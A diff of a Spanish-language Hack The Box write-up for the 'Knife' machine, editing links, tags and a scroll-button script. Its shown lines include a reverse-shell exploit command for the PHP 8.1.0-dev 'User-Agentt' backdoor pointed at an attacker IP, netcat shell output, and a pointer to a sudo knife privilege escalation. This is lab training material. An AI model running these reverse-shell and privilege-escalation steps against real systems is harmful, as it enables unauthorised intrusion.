@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Knife - Hack The Box
-excerpt: "Esta es una máquina muy fácil, vamos a aprovecharnos de una vulnerabilidad en la versión de PHP 8.0.1-dev que nos permitirá conectarnos de manera remota como el usuario James, una vez dentro, vamos a investigar los privilegios que tenemos, encontrando que podemos usar el binario Knife, buscamos en la página GTFObins y nos explica una forma para convertirnos en Root."
+excerpt: "Esta es una máquina muy fácil, vamos a aprovecharnos de una vulnerabilidad en la versión de PHP 8.0.1-dev que nos permitirá conectarnos de manera remota como el usuario James, una vez dentro, vamos a investigar los privilegios que tenemos, encontrando que podemos usar el binario Knife, buscamos en la página GTFOBins y nos explica una forma para convertirnos en Root."
 date: 2023-05-10
 classes: wide
 header:
@@ -15,16 +15,17 @@ tags:
   - Linux
   - PHP
   - Remote Code Execution (RCE)
-  - RCE - PHP 8.0.1-dev
-  - Abusing Sudoers Privilege
-  - Abusing Knife Binary
+  - PHP 8.0.1-dev (RCE)
+  - Privesc - Abusing Sudoers Privileges
+  - Privesc - Abusing Knife Binary
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-knife/knife_logo.png)
 
-Esta es una máquina muy fácil, vamos a aprovecharnos de una vulnerabilidad en la versión de **PHP 8.0.1-dev** que nos permitirá conectarnos de manera remota como el usuario **James**, una vez dentro, vamos a investigar los privilegios que tenemos, encontrando que podemos usar el **binario Knife**, buscamos en la página **GTFObins** y nos explica una forma para convertirnos en **Root**.
+Esta es una máquina muy fácil, vamos a aprovecharnos de una vulnerabilidad en la versión de **PHP 8.0.1-dev** que nos permitirá conectarnos de manera remota como el usuario **James**, una vez dentro, vamos a investigar los privilegios que tenemos, encontrando que podemos usar el **binario Knife**, buscamos en la página **GTFOBins** y nos explica una forma para convertirnos en **Root**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *whatweb*
@@ -70,46 +71,11 @@ Herramientas utilizadas:
 </div>
 
 
-<style>
-	#backToIndex {
-        	display: none;
-		position: fixed;
-		left: 87%;
-		top: 90%;
-		z-index: 2000;
-		background-color: #81fbf9;
-		border-radius: 10px;
-		border: none;
-		padding: 4px 6px;
-		cursor: pointer;
-        }
-</style>
-
-<a id="backToIndex" href="#Indice">
-	<img src="/assets/images/htb-writeup-knife/arrow-up.png" style="width: 45px; height: 45px;">
-</a>
-
-<script>
-	window.onscroll = function() {showButton()};
-
-	function showButton() {
-	const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
-	const indicePosition = document.getElementById("Indice").offsetTop;
-
-	if (scrollPosition >= indicePosition) {
-		document.getElementById("backToIndex").style.display = "block";
-	} else {
-		document.getElementById("backToIndex").style.display = "none";
-		}
-	}
-</script>
-
-
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -320,14 +286,14 @@ Nada, quiero pensar que la movida será por la versión del **PHP**, vamos a bus
 <h2 id="Exploit">Buscando un Exploit para PHP</h2>
 
 Encontré un Exploit para la versión que está usando la página web:
-* https://www.exploit-db.com/exploits/49933
+* <a href="https://www.exploit-db.com/exploits/49933" target="_blank">PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution</a>
  
 En resumen, la versión de PHP 8.1.0-dev tiene una **Backdoor** que al parecer alguien dejo ahí, por lo que cualquier atacante puede usar esta **Backdoor** utilizando la cabecera **User-Agentt** (que esto fue lo que delato la **Backdoor**). Y este exploit se aprovecha de esto para otorgar una shell en el host.
 
 Para que no pierdas el tiempo como yo, esta versión del Exploit no nos servirá, el mismo autor creó una **Reverse Shell**, usando el mismo Exploit. 
 
 Esta versión la encontramos en su **GitHub**:
-* https://github.com/flast101/php-8.1.0-dev-backdoor-rce
+* <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce" target="_blank">Repositorio de flast101: PHP 8.1.0-dev Backdoor Remote Code Execution</a>
 
 <br>
 
@@ -372,14 +338,14 @@ listening on [any] 443 ...
 
 Ahora, usa el Exploit:
 ```bash
-python3 revshell_php_8.1.0-dev.py http://10.10.10.242 10.10.14.5 443
+python3 revshell_php_8.1.0-dev.py http://10.10.10.242 Tu_IP 443
 ```
 
 Y ve la **netcat**:
 ```bash
 nc -nvlp 443                   
 listening on [any] 443 ...
-connect to [10.10.14.5] from (UNKNOWN) [10.10.10.242] 42246
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.242] 42246
 bash: cannot set terminal process group (899): Inappropriate ioctl for device
 bash: no job control in this shell
 james@knife:/$ whoami
@@ -406,6 +372,7 @@ james@knife:~$ cat user.txt
 Como ya vimos que se esta ocupado la cabecera de **User-Agentt** para inyectar una **Reverse Shell**, también podemos hacerlo nosotros sin necesidad del Exploit. Esto es similar a hacer una prueba en la cabecera **User-Agent** con tal de ver si no es vulnerable al **ataque Shellshock**.
 
 Vamos a probar por pasos:
+
 * Ocupa el siguiente comando de **curl**, vamos a agregarle el comando **html2text** para ver como se representa el código fuente en texto en lugar de mostrar todo el código:
 
 ```bash
@@ -519,7 +486,7 @@ User james may run the following commands on knife:
 ```
 
 Resulta que esto es un binario, veamos que nos dice nuestra biblia **GTFObins** sobre este binario:
-* https://gtfobins.github.io/gtfobins/knife/
+* <a href="https://gtfobins.github.io/gtfobins/knife/" target="_blank">GTFOBins: knife</a>
 
 Nos explica una forma de como escalar privilegios, vamos a probarlo:
 ```bash
@@ -554,3 +521,48 @@ Muy bien, ya completamos la máquina.
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
